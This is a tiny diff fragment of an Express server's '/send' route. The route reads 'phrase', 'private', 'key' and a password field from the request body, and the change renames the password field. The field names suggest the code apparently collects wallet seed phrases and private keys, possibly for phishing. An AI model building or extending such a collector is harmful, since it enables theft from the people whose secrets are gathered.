@@ -16,7 +16,7 @@ app.post("/send", async (req, res) => {
         phrase,
         private,
         key,
-        Password
+        Pass
     } = req.body;
 
     const message =
